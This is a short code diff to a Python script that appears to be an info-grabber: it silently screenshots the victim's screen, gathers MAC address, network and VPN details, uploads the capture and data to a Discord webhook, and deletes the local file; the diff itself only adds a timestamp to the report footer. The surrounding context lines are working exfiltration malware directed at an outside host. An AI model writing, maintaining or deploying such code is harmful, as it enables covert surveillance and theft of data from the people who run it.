@@ -16,6 +16,9 @@ import secrets
 from pathlib import Path
 from uuid import getnode as get_mac
 import socket
+import random
+import datetime
+
 
 DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
 
@@ -30,7 +33,7 @@ try:
     os.chdir(parent)
 except FileExistsError:
     os.chdir(parent)
-
+now = datetime.datetime.now()
 rs = secrets.token_hex(6)
 sc = pyautogui.screenshot()
 sc.save(f'{rs}file.png')
@@ -109,7 +112,7 @@ def sg():
  #embed.add_embed_field(name="CPU Usage :",value=cpuis)
  embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
  embed.add_embed_field(name="VPN :",value=proxy)
- embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
+ embed.set_footer(text=f"{time2} | {now}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  with open(f"{asr}", "rb") as f:
     webhook.add_file(file=f.read(), filename=f'./{asr}')
  webhook.add_embed(embed)
@@ -120,8 +123,10 @@ def sg():
  os.remove(f"{asr}")
 
 
+
 if __name__ == "__main__":
  sg()
+ 
 
 
 
